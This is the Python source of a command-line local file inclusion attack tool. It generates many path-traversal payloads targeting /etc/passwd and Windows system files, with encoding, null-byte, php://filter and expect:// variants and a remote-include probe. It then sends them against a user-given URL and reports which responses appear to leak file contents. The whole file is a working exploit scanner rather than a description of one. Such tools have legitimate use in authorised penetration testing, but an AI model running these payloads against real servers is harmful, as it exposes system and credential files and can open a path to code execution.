# to improve could add support for input and data PHP filters

# used https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
# and https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

import pathlib
import base64
from optparse import OptionParser
import json
import requests
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
#region Payload Generation

def urlencodeAll(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

def prefixPath(pl):
    payloads = []
    for x in pl:
        payloads.append("../../../../../../../../../../../../" + x);
    return payloads
        
def prefixPathSlash(pl):
    payloads = []
    for x in pl:
        payloads.append("/" + x);
    return payloads

def prefixPathNR(pl, multiple=False):
    payloads = []
    for x in pl:
        payloads.append("....////....////....////....////....////....////....////....////....////....////....////....////" + x);
        if multiple:
            payloads.append("....//....//....//....//....//....//....//....//....//....//....//....//" + x);
            payloads.append("..././..././..././..././..././..././..././..././..././..././..././..././" + x);
            payloads.append("....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/" + x);
    return payloads

def prefixDouble(pl):
    payloads = []
    for x in pl:
        payloads.append("..//..//..//..//..//..//..//..//..//..//..//..//" + x);
    return payloads

def forceBackslash(pl):
    payloads = []
    for x in pl:
        payloads.append(x.replace("/", "\\"));
    return payloads

def urlencodePay(pl):
    payloads = []
    for x in pl:
        payloads.append(urlencodeAll(x));
    return payloads

def doubleUrlencodePay(pl):
    payloads = []
    for x in pl:
        payloads.append(urlencodeAll(urlencodeAll(x)));
    return payloads

def base64Pay(pl):
    payloads = []
    for x in pl:
        payloads.append(base64.b64encode(x.encode('ascii')).decode("ascii"));
    return payloads

def doubleBase64Pay(pl):
    payloads = []
    for x in pl:
        payloads.append(base64.b64encode(base64.b64encode(x.encode('ascii'))).decode("ascii"));
    return payloads

def prefixInvalidPath(pl):
    payloads = []
    for x in pl:
        payloads.append("UNLIKELYFILENAMEAHA/" + x);
    return payloads

def suffixNullbytes(pl):
    payloads = []
    for x in pl:
        payloads.append(x + "%00");
    return payloads

def filterB64(pl):
    payloads = []
    for x in pl:
        payloads.append("php://filter/read=convert.base64-encode/resource=" + x);
    return payloads

def append4096(pl):
    payloads = []
    for x in pl:
        payloads.append(x + "/." * 2048)
    return payloads

defaultOptions = {
    "base": True,
    "pref": True,
    "prefS": True,
    "prefNR": True,
    "prefNRM": False,
    "prefD": True,
    "back": True,
    "prefInv": True,
    "nullbytes": True,
    "urlencode": True,
    "urlencodeD": False,
    "base64": False,
    "base64D": False,
    "phpfilter64": True,
    "phpexpect": True,
    "phpstreams": True,
    "phpstring": False,
    "rfi": True
}

fullOptions = {
    "base": True,
    "pref": True,
    "prefS": True,
    "prefNR": True,
    "prefNRM": True,
    "prefD": True,
    "back": True,
    "prefInv": True,
    "nullbytes": True,
    "urlencode": True,
    "urlencodeD": True,
    "base64": True,
    "base64D": True,
    "phpfilter64": True,
    "phpexpect": True,
    "phpstreams": True,
    "phpstring": True,
    "rfi": True
}

def generate(files, options):
    base = files.copy() if options.get("base") else []
    base += prefixPath(files) if options.get("pref") else []
    base += prefixPathNR(files, options.get("prefNRM")) if options.get("prefNR") else []
    base += prefixDouble(files) if options.get("prefD") else []

    forward = base.copy()
    forward += prefixPathSlash(forward) if options.get("prefS") else []
    forward += prefixInvalidPath(forward) if options.get("prefInv") else []
    forward += forceBackslash(forward) if options.get("back")  else []
    forward += filterB64(files) if options.get("phpfilter64") else [] # just takes the base files, doesnt need dir traversal, do want to append %00 though.
    forward += ["expect://ls"] if options.get("phpexpect") else []
    forward += ["php://stdin", "php://stdout", "php://stderr"] if options.get("phpstreams") else []
    forward += ["https://www.google.com/"] if options.get("rfi") else []
    
    output = forward.copy()
    output += suffixNullbytes(forward) if options.get("nullbytes") else []
    output += append4096(forward) if options.get("phpstring") else []
    
    output += urlencodePay(forward) if options.get("urlencode") else []
    output += doubleUrlencodePay(forward) if options.get("urlencodeD") else []
    output += base64Pay(forward) if options.get("base64") else []
    output += doubleBase64Pay(forward) if options.get("base64D") else []

    pathlib.Path("./out").mkdir(parents=True, exist_ok=True)
    outFile = open("./out/payload.txt", "w+")
    outFile.writelines(line + '\n' for line in output)
    return output

#endregion

def getTextLen(str):
    return len(str.encode('utf-8'))

def deleteLastLine():
    sys.stdout.write('\x1b[1A')
    sys.stdout.write('\x1b[2K')

def checkResponseType(url):
    print('Checking server response..')
    r1 = requests.get(url + '?ඖྦྷ⎲')
    r2 = requests.get(url + '?ඖඖྦྷ⎲')
    r3 = requests.get(url + '?ඖඖඖྦྷ⎲')
    r1len = getTextLen(r1.text)
    r2len = getTextLen(r2.text)
    r3len = getTextLen(r3.text)
    responseType = []
    if r1.text == r2.text == r3.text:
        responseType = ['nofeedback', r1len, r1.status_code]
        print(f'Detected no feedback from server, going in {bcolors.BOLD}blind{bcolors.ENDC}')
        print(f"Response size: {r1len}, {r2len}, {r3len}")
    else:
        if abs(r1len - r2len) > 100 or abs(r1len - r3len) > 100 or abs(r2len - r3len) > 100:
            responseType = ['random', -1, r1.status_code]
            print(f'{bcolors.FAIL}Server response seemingly random. Exiting..{bcolors.ENDC}')
            print(f"Response size: {r1len}, {r2len}, {r3len}")
        else:
            responseType = ['feedback', max(r1len, r2len, r2len), r1.status_code]
            print(f'Detected some {bcolors.BOLD}feedback{bcolors.ENDC} from server.')
            print(f"Response size: {r1len}, {r2len}, {r3len}")
    print('\n')
    return responseType
    
badText = [
    'was not found',
    'Warning: include',
    'failed to open stream:',
    'No such file or directory'
]

def checkLFI(response, responseType):
    if str(response.status_code)[0] != "2" and response.status_code == responseType[2]:
        return False
    if response.status_code == 403 or response.status_code == 404:
        return False
    
    if responseType[0] == 'feedback' or responseType[0] == 'random':
        for x in badText:
            if x in response.text:
                return False
        return True
    elif responseType[0] == "nofeedback":
        return getTextLen(response.text) != responseType[1]
    else:
        print(f"Invalid ResponseType {responseType[0]} {responseType[1]} {responseType[2]}")

def printIfLFI(payloadLine, response, responseType, writeToFile, file = None, printFail = False):
        tlen = getTextLen(response.text)
        isLFI = checkLFI(response, responseType)
        if isLFI:
            out1 = f"Status: " + (f"{bcolors.OKGREEN}" if str(response.status_code)[0] == "2" else f"{bcolors.FAIL}") + f"{response.status_code}{bcolors.ENDC}"
            out1 += f"\tSize: {tlen}\t"
            out1 += "Payload: " + (payloadLine if len(payloadLine) < 100 else payloadLine[:100] + "{...}")
            print(out1)
            out2 = f"Status: {response.status_code}\tSize: {tlen}\tPayload: {payloadLine}\n"
            if writeToFile:
                file.write(out2)
        elif printFail:
            print(f"{bcolors.FAIL}Status: {response.status_code}\tSize: {tlen}\tPayload: {payloadLine}{bcolors.ENDC}")

def attack(url, payload, writeToFile = True, printFail = False):
    responseType = checkResponseType(url)
    print(f'{bcolors.OKBLUE}Attacking the server..{bcolors.ENDC}')
    print(f"{bcolors.BOLD}[0/{len(payload) - 1}]{bcolors.ENDC}")
    
    pathlib.Path("./out").mkdir(parents=True, exist_ok=True)
    resultsFile = open("out/attackResults.txt", "w+") if writeToFile else None
    for i in range(len(payload)):
        r = requests.get(url + payload[i])
        deleteLastLine()
        printIfLFI(payload[i], r, responseType, writeToFile, resultsFile, printFail)
        print(f"{bcolors.BOLD}[{i}/{len(payload) - 1}]{bcolors.ENDC}")


fileForOS = {
    "linux": "lfiFiles/Linux.txt",
    "windows": "lfiFiles/Win.txt",
    "mac": "lfiFiles/Mac.txt"
}

testerForOS = {
    "linux": "/etc/passwd",
    "windows": "/Windows/System32/drivers/etc/hosts",
    "mac": "/etc/hosts"
}

def main():
    parser = OptionParser()
    parser.add_option('-u', '--url', dest='url', help='URL that you want to scan (e.g. http://very.secure.com/index.php?page=)')
    parser.add_option('-o', '--operating-system', dest='os', default='linux', help='Operating system that the machine (server) is running (linux, windows, mac)')
    parser.add_option("-f", "--full-options", dest="full", action="store_true", default=False, help="Use every method avalible.")
    parser.add_option("-j", "--json-options", dest="json", help="Use a JSON file to supply the options for the LFI.")
    parser.add_option("-c", "--custom-files", dest="files", help="Apply LFI methods for all potential files in specified file. Value: 1 to use built-in list for specified OS.")
    parser.add_option('-p', '--payload-file', dest='payload', help="Specify the payload file to be used instead of generating one.")
    parser.add_option("-d", "--dont-attack", dest="dontAttack", action="store_true", default=False, help="Just make the payload file, don't send requests to the server.")
    (commandOptions, args) = parser.parse_args()
    
    payload = []
    if commandOptions.payload != None:
        payload = open(commandOptions.payload, "r").read().split('\n')
    else:
        baseFiles = []
        if commandOptions.files != None:
            baseFiles = open(commandOptions.files if commandOptions.files != "1" else fileForOS[commandOptions.os], "r").read().split('\n')
        else:
            baseFiles = [testerForOS[commandOptions.os]]
        
        if "" in baseFiles:
            baseFiles.remove("")
        
        options = defaultOptions
        if commandOptions.full == True:
            options = fullOptions
        if commandOptions.json != None:
            options = json.load(open(commandOptions.json))

        payload = generate(baseFiles, options)
    
    if commandOptions.dontAttack == True:
        print("Saved payload. Not attacking.")
        exit()
    
    if commandOptions.url == None:
        print("No URL specified. -h or --help for the manual.")
        exit()
        
    attack(commandOptions.url, payload)
    
if __name__ == "__main__":
    main()